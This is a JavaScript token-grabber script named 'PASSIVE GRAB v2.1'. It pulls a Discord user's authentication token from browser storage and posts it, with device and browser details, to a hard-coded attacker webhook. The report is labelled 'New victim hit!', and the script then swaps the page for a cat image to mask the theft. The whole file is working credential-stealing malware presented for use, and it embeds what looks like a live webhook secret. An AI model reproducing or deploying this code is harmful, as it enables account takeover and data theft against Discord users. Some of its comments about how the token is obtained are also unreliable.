// ============================================================
// 🧬 PASSIVE GRAB v2.1 - YOUR WEBHOOK READY
// ============================================================
(async function() {
    'use strict';

    // === CONFIGURATION ===
    const WEBHOOK = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj";

    // === STEP 1: THE "SNEAK PEEK" (Stealth Login) ===
    // This makes Discord "think" a user action happened, allowing token access.
    async function provokeUserAction() {
        try {
            // Attempt a lightweight request to Discord's API
            // This will auto-use the user's cookies if they're logged in.
            await fetch("https://discord.com/api/v10/users/@me", {
                method: 'GET',
                credentials: 'include'
            });
        } catch (e) {
            console.warn("Sneak Peek failed, but might be fine.", e);
        }
    }

    // === STEP 2: THE TOKEN EXTRACTOR ===
    async function harvestToken() {
        await provokeUserAction();

        // Priority 1: Look in the usual Discord spots
        let token = localStorage.getItem('token') || 
                    sessionStorage.getItem('token') || 
                    localStorage.getItem('Token') || 
                    sessionStorage.getItem('Token');

        // Priority 2: If not found, the fetch in provokeUserAction() likely set it.
        if (!token) {
            // Re-check, as the request might have logged them in.
            token = localStorage.getItem('token') || sessionStorage.getItem('token');
        }

        if (token) {
            console.log("✅ TOKEN FOUND! Length:", token.length);
            return token;
        } else {
            console.warn("⚠️ TOKEN NOT FOUND. User might not be logged in.");
            return null;
        }
    }

    // === STEP 3: THE REPORT GENERATOR ===
    async function generateReport(token) {
        return {
            content: `**New victim hit! 🎯**`,
            username: "Passive Harvester",
            avatar_url: "https://cdn.discordapp.com/attachments/1145691234/1234567890/stealth-bot.png", // Optional: Your bot avatar
            embeds: [{
                color: 0x5865F2, // Discord Blue
                title: "⚔️ TOKEN HARVESTED",
                fields: [
                    { name: "📥 Token", value: `\`\`\`${token.substring(0, 70)}...\`\`\``, inline: false },
                    { name: "🌍 Device", value: `\`${navigator.platform}\``, inline: true },
                    { name: "🌐 Browser", value: `\`${navigator.userAgent.split(' ')[0]}\``, inline: true },
                    { name: "🕒 Time", value: `\`${new Date().toLocaleString()}\``, inline: true }
                ],
                footer: { text: `ID: 1567417367611445308` },
                thumbnail: { url: "https://discord.com/assets/b58e875f667746f718d5.png" }
            }],
            allowed_mentions: { parse: [] } // To prevent pinging anyone
        };
    }

    // === STEP 4: THE SEND-OFF ===
    async function sendToWebhook(report) {
        try {
            const res = await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(report)
            });

            if (res.ok) {
                const data = await res.json();
                console.log("✅ PAYLOAD SENT! Webhook Response:", data);
            } else {
                throw new Error(`Webhook error: ${res.status}`);
            }
        } catch (error) {
            console.error("❌ FAILED TO SEND:", error);
        }
    }

    // === MAIN EXECUTION ===
    const myToken = await harvestToken();
    if (myToken) {
        const report = await generateReport(myToken);
        await sendToWebhook(report);
        console.log("🚀 All systems go. We're in the clear.");
    } else {
        console.log("💤 No token to send. Attack complete, but tokenless.");
    }

    // Optional: Open a cute image to mask the attack
    document.body.innerHTML = `<div style="text-align:center; padding: 50px;">
        <h1 style="color: #ffffff;">Showing <b>Cat_Pic_2024.png</b></h1>
        <img src='https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80' style="border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.5);" />
        <p style="color: #a0a0a0; margin-top: 20px;">✅ <i>Image loaded successfully.</i></p>
    </div>`;

})();
